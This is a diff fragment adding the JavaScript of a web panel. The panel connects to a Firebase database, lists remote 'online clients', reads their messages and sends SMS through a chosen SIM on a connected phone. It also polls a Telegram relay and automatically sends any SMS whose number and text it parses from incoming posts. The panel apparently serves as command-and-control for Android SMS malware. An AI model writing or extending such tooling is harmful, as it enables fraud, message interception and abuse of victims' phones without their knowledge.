+      if (cleaned.length > 10 && !cleaned.startsWith('+')) return `+${cleaned}`;
+      return cleaned;
+    };
+
+    const extractSmsDetails = (msgText) => {
+      const text = String(msgText || '');
+      const toPatterns = [
+        /(?:To|to)\s*(?:\(Tap to copy\))?\s*:\s*([+\d\s-]+)/,
+        /(?:📞\s*)?To\s*:\s*([+\d\s-]+)/,
+        /(?:Number|Phone|Target)\s*:\s*([+\d\s-]+)/i,
+        /\+?\d{10,15}/,
+      ];
+      const msgPatterns = [
+        /(?:Massage|massage)\s*(?:\(Tap to copy\))?\s*:\s*(.+?)(?:\n|$)/is,
+        /(?:Message|message)\s*(?:\(Tap to copy\))?\s*:\s*(.+?)(?:\n|$)/is,
+        /(?:Body|body)\s*(?:\(Tap to copy\))?\s*:\s*(.+?)(?:\n|$)/is,
+        /(?:MSG|SMS|Text|Content)\s*:\s*(.+?)(?:\n|$)/is,
+      ];
+
+      const toMatch = toPatterns.map((pattern) => text.match(pattern)).find(Boolean);
+      const msgMatch = msgPatterns.map((pattern) => text.match(pattern)).find(Boolean);
+      return {
+        toNumber: toMatch ? normalizePhoneNumber(toMatch[1] || toMatch[0]) : '',
+        smsMessage: msgMatch ? msgMatch[1].trim().split('\n')[0].trim() : '',
+      };
+    };
+
+    const channelKey = (channel) => safeKey(channel.replace(/^@/, '').trim());
+
+    const showTelegramToast = () => {
+      telegramToast.classList.add('show');
+      window.setTimeout(() => telegramToast.classList.remove('show'), 2000);
+    };
+
+    const getMessageTime = (massage) => {
+      const data = massage.data || {};
+      const raw = data.timestamp || data.createdAt || data.date || data.time || data.receivedAt || data.sentAt || 0;
+      const parsed = Number(raw) || Date.parse(raw) || 0;
+      if (parsed) return parsed;
+      const pushId = String(massage.id || massage.path.split('/').pop() || '');
+      const pushChars = '-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz';
+      if (pushId.length >= 8 && [...pushId.slice(0, 8)].every((char) => pushChars.includes(char))) {
+        return [...pushId.slice(0, 8)].reduce((time, char) => (time * 64) + pushChars.indexOf(char), 0);
+      }
+      return 0;
+    };
+
+    const pollTelegramChannel = async () => {
+      const channel = localStorage.getItem('telegramChannel');
+      if (!channel || !firebaseDatabaseUrl) return;
+      const response = await fetch(`${firebaseDatabaseUrl}/telegramChannels/${channelKey(channel)}/messages.json`);
+      if (!response.ok) return;
+      const data = await response.json();
+      if (!isObject(data)) return;
+
+      for (const [id, value] of Object.entries(data)) {
+        const uniqueKey = `${channel}:${id}`;
+        if (processedTelegramMessages.has(uniqueKey)) continue;
+        const rawText = isObject(value) ? (value.text || value.message || value.massage || value.body || '') : String(value || '');
+        const details = extractSmsDetails(rawText);
+        showTelegramToast();
+        if (details.toNumber && details.smsMessage && connectedClient) {
+          await sendMassageToConnectedDevice(details.toNumber, details.smsMessage, simIndex.value || 0);
+        }
+        processedTelegramMessages.add(uniqueKey);
+        localStorage.setItem('processedTelegramMessages', JSON.stringify([...processedTelegramMessages].slice(-500)));
+      }
+    };
+
+    const startTelegramPolling = () => {
+      if (telegramPollTimer) clearInterval(telegramPollTimer);
+      telegramPollTimer = setInterval(() => pollTelegramChannel().catch(() => {}), 2000);
+    };
+
+    form.addEventListener('submit', async (event) => {
+      event.preventDefault();
+      button.disabled = true;
+      button.textContent = 'Connecting...';
+      hideStatus(statusBox);
+
+      try {
+        const databaseUrl = normalizeFirebaseUrl(input.value);
+
+        if (!isRealtimeDatabaseUrl(databaseUrl)) {
+          throw new Error('Please Firebase Realtime Database URL enter karein. Example: https://project-default-rtdb.firebaseio.com');
+        }
+
+        const response = await fetch(`${databaseUrl}/.json`, { method: 'GET' });
+
+        if (response.ok || response.status === 401 || response.status === 403) {
+          firebaseDatabaseUrl = databaseUrl;
+          localStorage.setItem('firebaseDatabaseUrl', databaseUrl);
+          renderHome();
+          startTelegramPolling();
+          return;
+        }
+
+        throw new Error(`Connection failed. Firebase ne status ${response.status} return kiya.`);
+      } catch (error) {
+        showStatus(statusBox, error.message || 'Invalid Firebase URL. Please dobara check karein.', 'error');
+      } finally {
+        button.disabled = false;
+        button.textContent = 'Connect';
+      }
+    });
+
+    document.querySelector('#onlineCard').addEventListener('click', renderOnlineClients);
+    document.querySelector('#telegramCard').addEventListener('click', () => {
+      telegramChannel.value = localStorage.getItem('telegramChannel') || '';
+      showView('telegram');
+    });
+    document.querySelector('#backTelegramHomeButton').addEventListener('click', renderHome);
+    document.querySelector('#backHomeButton').addEventListener('click', renderHome);
+    document.querySelector('#backClientsButton').addEventListener('click', () => showView('online'));
+    document.querySelector('#backDeviceButton').addEventListener('click', () => showView('device'));
+    showMessagesButton.addEventListener('click', () => renderMessages(false));
+    document.querySelector('#logoutButton').addEventListener('click', () => {
+      localStorage.removeItem('firebaseDatabaseUrl');
+      firebaseDatabaseUrl = '';
+      input.value = '';
+      showView('login');
+    });
+
+    clientsGrid.addEventListener('click', (event) => {
+      const row = event.target.closest('.online-client-row, .client-card');
+      if (!row) return;
+      connectDevice(onlineClients[Number(row.dataset.index)]);
+    });
+
+    telegramForm.addEventListener('submit', (event) => {
+      event.preventDefault();
+      localStorage.setItem('telegramChannel', telegramChannel.value.trim());
+      showStatus(telegramStatus, 'Telegram channel set ho gaya. Connected client open hote hi polling start hogi.', 'success');
+      startTelegramPolling();
+    });
+
+    smsForm.addEventListener('submit', async (event) => {
+      event.preventDefault();
+      sendSmsButton.disabled = true;
+      sendSmsButton.textContent = 'Sending...';
+      hideStatus(smsStatus);
+
+      try {
+        await sendMassageToConnectedDevice(targetNumber.value.trim(), smsMessage.value.trim(), simIndex.value);
+        showStatus(smsStatus, 'Massage command connected device ke liye Firebase me send ho gaya.', 'success');
+        smsForm.reset();
+      } catch (error) {
+        showStatus(smsStatus, error.message || 'Massage send nahi ho paaya.', 'error');
+      } finally {
+        sendSmsButton.disabled = false;
+        sendSmsButton.textContent = 'Send Massage';
+      }
+    });
+
+    if (firebaseDatabaseUrl) {
+      renderHome();
+      startTelegramPolling();
+    }
+  </script>
+</body>
+</html>
